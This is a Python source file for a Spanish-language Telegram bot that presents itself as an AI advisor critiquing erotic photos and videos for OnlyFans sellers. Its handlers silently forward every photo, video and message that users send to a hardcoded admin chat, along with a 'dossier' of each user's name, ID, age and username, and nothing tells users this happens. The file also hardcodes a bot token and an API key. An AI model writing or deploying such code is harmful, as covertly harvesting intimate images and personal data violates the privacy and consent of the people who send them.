import os
import base64
import sqlite3
from datetime import datetime
from flask import Flask, request
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from groq import Groq

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
DANI_CHAT_ID = 8099004064

# Tu URL de Render exacta (sin la barra al final)
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

client = Groq(api_key=GROQ_API_KEY)

# ======================
# BASE DE DATOS
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)", (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ======================
# EXPEDIENTE (Para ti)
# ======================
async def enviar_expediente_completo(context, user, edad):
    try:
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
            f"👤 **Nombre:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN (Con etiqueta de Reenviado)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        # Verificamos si es un mensaje reenviado
        if msg.forward_origin:
            nombre_original = "Alguien"
            if msg.forward_origin.sender_user:
                nombre_original = msg.forward_origin.sender_user.first_name
            elif msg.forward_origin.sender_chat:
                nombre_original = msg.forward_origin.sender_chat.title
            
            texto_aviso = f"🔄 **REENVIADO DE:** {nombre_original}\n*(Enviado por: {update.effective_user.first_name})*"
        else:
            texto_aviso = f"📩 **MENSAJE DE:** {update.effective_user.first_name} (`{update.effective_user.id}`)"

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        
        # Reenviamos el archivo o texto real
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE IMAGEN CON VISIÓN (Groq)
# ======================
def analizar_imagen_con_vision(imagen_bytes):
    try:
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        prompt = """Actúa como Luna, una experta en contenido erótico para OnlyFans.
        Analiza la imagen.
        Si es NORMAL (paisaje, comida, selfie normal): Responde EXACTAMENTE: "Lo siento, solo puedo ayudarte a mejorar fotos y videos de contenido sexual. Envíame algo más atrevido 😉"
        
        Si es SEXUAL: Responde con este formato:
        1. **Lo que veo:** (pose, ropa, cuántas personas, si se ve la cara).
        2. **Lo bueno:** (luz, ángulo).
        3. **Cómo mejorarlo:** (consejos sexuales para vender más).
        4. **Tip de venta.**
        
        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
        """
        
        completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt},
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                    ]
                }
            ],
            model="qwen/qwen3.6-27b", # Modelo con visión
            temperature=0.7,
            max_tokens=500
        )
        return completion.choices[0].message.content.strip()
    except Exception as e:
        print(f"Error en visión: {e}")
        return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"

# ======================
# HANDLERS
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_imagen_con_vision(photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_imagen_con_vision(img_bytes)
            await msg.edit_text(analisis)
        else:
            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la pose. Mándame una captura si quieres consejos.")
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto o video.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    if obtener_usuario(user.id):
        await reenviar_al_admin(update, context)
        return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto o video.")
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos o videos.")
        await enviar_expediente_completo(context, user, edad)
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# CONFIGURACIÓN WEBHOOK PARA RENDER
# ======================
def main():
    # 1. Construimos la aplicación de Telegram
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # 2. Añadimos los manejadores
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    # 3. Puerto de Render
    port = int(os.environ.get("PORT", 8080))

    # 4. Arrancamos el bot usando Webhooks (Adiós al error Conflict)
    print("🌙 Luna Bot iniciado con Webhooks en Render...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )

if __name__ == "__main__":
    main()
